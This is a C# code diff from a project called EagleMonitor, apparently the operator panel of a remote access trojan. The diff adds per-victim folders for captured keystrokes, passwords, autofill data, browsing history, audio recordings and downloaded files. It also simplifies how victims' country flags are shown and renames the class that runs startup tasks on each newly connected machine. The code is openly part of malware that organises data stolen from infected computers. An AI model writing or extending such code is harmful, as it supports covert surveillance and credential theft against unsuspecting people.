@@ -47,6 +47,14 @@ namespace EagleMonitor.PacketParser
 
                 clientHandler.clientPath = Miscellaneous.GPath + "\\Clients\\" + connectedPacket.Username + "@" + connectedPacket.HWID;
                 clientHandler.fullName = connectedPacket.Username + "@" + connectedPacket.HWID;
+                
+                Directory.CreateDirectory(clientHandler.clientPath + "\\Downloaded Files\\");
+                Directory.CreateDirectory(clientHandler.clientPath + "\\History\\");
+                Directory.CreateDirectory(clientHandler.clientPath + "\\Autofill\\");
+                Directory.CreateDirectory(clientHandler.clientPath + "\\Keystrokes\\");
+                Directory.CreateDirectory(clientHandler.clientPath + "\\Keywords\\");
+                Directory.CreateDirectory(clientHandler.clientPath + "\\Passwords\\");
+                Directory.CreateDirectory(clientHandler.clientPath + "\\Audio Records\\");
 
                 Program.mainForm.dataGridView1.BeginInvoke((MethodInvoker)(() =>
                 {
@@ -54,37 +62,11 @@ namespace EagleMonitor.PacketParser
 
                     DataGridViewRow row = Program.mainForm.dataGridView1.Rows[rowId];
 
-                    switch (Miscellaneous.settings.flagsPackName) 
-                    {
-                        case "FlagsBase":
-                            if (File.Exists(Miscellaneous.GPath + "\\Flags\\FlagsBase\\" + connectedPacket.RegionFlag.ToLower() + ".png"))
-                                row.Cells["Column1"].Value = Miscellaneous.resizeImage(Image.FromFile(Miscellaneous.GPath + "\\Flags\\FlagsBase\\" + connectedPacket.RegionFlag.ToLower() + ".png"), new Size(26, 26));
-                            else
-                                row.Cells["Column1"].Value = Miscellaneous.resizeImage(Image.FromFile(Miscellaneous.GPath + "\\Flags\\FlagsBase\\" + "UKN" + ".png"), new Size(26, 26));
-                            break;
+                    if (File.Exists(Miscellaneous.GPath + $"\\Flags\\{Miscellaneous.settings.flagsPackName}\\" + connectedPacket.RegionFlag.ToLower() + ".png"))
+                        row.Cells["Column1"].Value = Miscellaneous.resizeImage(Image.FromFile(Miscellaneous.GPath + $"\\Flags\\{Miscellaneous.settings.flagsPackName}\\" + connectedPacket.RegionFlag.ToLower() + ".png"), new Size(26, 26));
+                    else
+                        row.Cells["Column1"].Value = Miscellaneous.resizeImage(Image.FromFile(Miscellaneous.GPath + "\\Flags\\FlagsBase\\" + "UKN" + ".png"), new Size(26, 26));
 
-                        case "FlagsPack1":
-                            if (File.Exists(Miscellaneous.GPath + "\\Flags\\FlagsPack1\\" + connectedPacket.RegionFlag.ToLower() + ".ico"))
-                                row.Cells["Column1"].Value = Miscellaneous.resizeImage(Image.FromFile(Miscellaneous.GPath + "\\Flags\\FlagsPack1\\" + connectedPacket.RegionFlag.ToLower() + ".ico"), new Size(26, 26));
-                            else
-                                row.Cells["Column1"].Value = Miscellaneous.resizeImage(Image.FromFile(Miscellaneous.GPath + "\\Flags\\FlagsBase\\" + "UKN" + ".png"), new Size(26, 26));
-                            break;
-
-                        case "FlagsPack2":
-                            if (File.Exists(Miscellaneous.GPath + "\\Flags\\FlagsPack2\\" + connectedPacket.RegionFlag.ToLower() + ".png"))
-                                row.Cells["Column1"].Value = Miscellaneous.resizeImage(Image.FromFile(Miscellaneous.GPath + "\\Flags\\FlagsPack2\\" + connectedPacket.RegionFlag.ToLower() + ".png"), new Size(26, 26));
-                            else
-                                row.Cells["Column1"].Value = Miscellaneous.resizeImage(Image.FromFile(Miscellaneous.GPath + "\\Flags\\FlagsBase\\" + "UKN" + ".png"), new Size(26, 26));
-                            break;
-
-                        case "FlagsPack3":
-                            if (File.Exists(Miscellaneous.GPath + "\\Flags\\FlagsPack3\\" + connectedPacket.RegionFlag.ToLower() + ".png"))
-                                row.Cells["Column1"].Value = Miscellaneous.resizeImage(Image.FromFile(Miscellaneous.GPath + "\\Flags\\FlagsPack3\\" + connectedPacket.RegionFlag.ToLower() + ".png"), new Size(26, 26));
-                            else
-                                row.Cells["Column1"].Value = Miscellaneous.resizeImage(Image.FromFile(Miscellaneous.GPath + "\\Flags\\FlagsBase\\" + "UKN" + ".png"), new Size(26, 26));
-                            break;
-                    }
-                
                     row.Cells["Column2"].Value = connectedPacket.HWID;
                     row.Cells["Column3"].Value = clientHandler.IP;
                     row.Cells["Column4"].Value = connectedPacket.OSName;
@@ -110,11 +92,11 @@ namespace EagleMonitor.PacketParser
 
                 }));
 
-                if (StartupTaskWorker.startupTaskExisting)
+                if (StartupTaskHandler.startupTaskExisting)
                 {
-                    foreach (ITasks task in StartupTaskWorker.allTask)
+                    foreach (ITasks task in StartupTaskHandler.allTask)
                     {
-                        new StartupTaskWorker(task, clientHandler);
+                        new StartupTaskHandler(task, clientHandler);
                     }
                 }
                 return;
